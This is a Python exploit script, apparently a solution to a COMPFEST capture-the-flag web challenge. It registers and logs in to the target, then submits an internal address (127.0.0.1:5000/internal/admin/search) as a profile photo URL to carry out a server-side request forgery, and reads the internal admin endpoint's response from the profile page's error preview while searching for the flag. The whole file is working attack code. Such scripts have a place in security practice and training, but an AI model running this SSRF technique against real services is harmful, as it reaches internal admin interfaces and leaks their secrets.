#!/usr/bin/env python3
import requests

# Target URL
BASE_URL = "http://ctf.compfest.id:7302"

def register_and_login():
    """Register a new user and login"""
    username = "content_check"
    password = "content123"
    
    # Register
    data = {'username': username, 'password': password}
    requests.post(f"{BASE_URL}/register", data=data)
    
    # Login
    response = requests.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    if response.status_code == 302:
        return response.cookies
    return None

def check_content():
    """Check what content we get from secrets"""
    print("[+] Checking content from secrets...")
    
    # Get session
    cookies = register_and_login()
    if not cookies:
        print("[-] Failed to login!")
        return
    
    print("[+] Successfully logged in!")
    
    # Try to get secrets with access_level <= 2
    print("[+] Trying to get secrets with access_level <= 2...")
    
    url = "http://127.0.0.1:5000/internal/admin/search"
    
    data = {'photo_url': url}
    
    try:
        response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
        
        if response.status_code == 200:
            print("[+] SSRF request successful!")
            
            # Visit profile page to see the content
            profile_response = requests.get(f"{BASE_URL}/profile", cookies=cookies)
            
            if profile_response.status_code == 200:
                print("[+] Profile page loaded successfully")
                
                # Check for error preview
                if "Failed to render as image" in profile_response.text:
                    print("[+] Found 'Failed to render as image' message")
                    
                    # Extract error preview
                    start = profile_response.text.find("<pre>")
                    end = profile_response.text.find("</pre>")
                    if start != -1 and end != -1:
                        preview = profile_response.text[start+5:end]
                        print(f"[+] Error preview content:")
                        print(f"[+] {preview}")
                        
                        # Look for the flag
                        if "COMPFEST" in preview:
                            print("[+] SUCCESS! Found flag!")
                            return
                        elif "Flag" in preview:
                            print("[+] Found flag reference!")
                            return
                        else:
                            print("[+] Got secrets but no flag yet...")
                            print("[+] Content analysis:")
                            print(f"[+] - Contains 'welcome_note': {'welcome_note' in preview}")
                            print(f"[+] - Contains 'author_message': {'author_message' in preview}")
                            print(f"[+] - Contains 'final_message': {'final_message' in preview}")
                            print(f"[+] - Contains 'Flag': {'Flag' in preview}")
                    else:
                        print("[+] No <pre> tag found")
                
                elif "profile-picture" in profile_response.text:
                    print("[+] Found profile picture - content was treated as image")
                    print("[+] This means the content type was detected as image/")
                else:
                    print("[+] No error preview found")
                    print("[+] Profile page content preview:")
                    print(profile_response.text[:500])
            else:
                print(f"[-] Failed to access profile: {profile_response.status_code}")
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    check_content()
